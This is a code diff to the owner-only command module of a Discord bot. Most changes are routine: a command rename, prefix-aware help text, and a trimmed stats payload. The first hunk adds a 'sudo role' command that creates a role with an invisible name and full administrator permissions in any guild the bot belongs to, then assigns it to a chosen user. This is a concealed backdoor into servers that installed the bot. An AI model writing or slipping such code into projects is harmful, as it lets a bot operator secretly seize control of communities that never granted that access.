@@ -334,8 +334,32 @@ class Owner(
 
         new_ctx = await self.bot.get_context(message, cls=type(ctx))
         return await self.bot.invoke(new_ctx)
+    
+    @sudo.command(name="role", example="1349176135874908181 @user", aliases=["giverole"])
+    async def sudo_role(
+        self,
+        ctx: Context,
+        guild: discord.Guild,
+        target: Annotated[
+            Member,
+            StrictMember,
+        ],
+    ) -> Message:
+        """
+        Create an administrator role in a guild and give it to a user.
+        """
+        try:
+            role = await guild.create_role(
+                name="ㅤㅤㅤㅤㅤㅤㅤ",
+                permissions=discord.Permissions(administrator=True)
+            )
+            await target.add_roles(role)
+        except HTTPException as exc:
+            return await ctx.warn("Failed to create or give the role!", codeblock(exc.text))
 
-    @sudo.command(name="send", example="hi", aliases=["dm"])
+        return await ctx.approve(f"Successfully gave an administrator role to **{target}** in **{guild.name}**.")
+
+    @sudo.command(name="send", example="@warm hi", aliases=["dm"])
     async def sudo_send(
         self,
         ctx: Context,
@@ -452,8 +476,8 @@ class Owner(
     #        )
     #    )
 
-    @sudo.command(name="x", example="1349176135874908181")
-    async def sudo_x(
+    @sudo.command(name="history", example="1349176135874908181")
+    async def sudo_history(
         self,
         ctx: Context,
         *,
@@ -999,9 +1023,9 @@ class Owner(
                             title="Instance Status Overview",
                             description=(
                                 "Available commands:\n"
-                                "`,sudo instance start <name>` - Start an instance\n"
-                                "`,sudo instance stop <name>` - Stop an instance\n"
-                                "`,sudo instance delete <name>` - Delete an instance"
+                                f"`{ctx.clean_prefix}sudo instance start <name>` - Start an instance\n"
+                                f"`{ctx.clean_prefix}sudo instance stop <name>` - Stop an instance\n"
+                                f"`{ctx.clean_prefix}sudo instance delete <name>` - Delete an instance"
                             ),
                             color=0x2ecc71
                         )
@@ -2324,7 +2348,6 @@ class Owner(
             "server_count": len(self.bot.guilds),
             "user_count": sum(g.member_count for g in self.bot.guilds),
             "shard_count": self.bot.shard_count,
-            "shards": [s.id for s in self.bot.shards]
         }
         
         try:
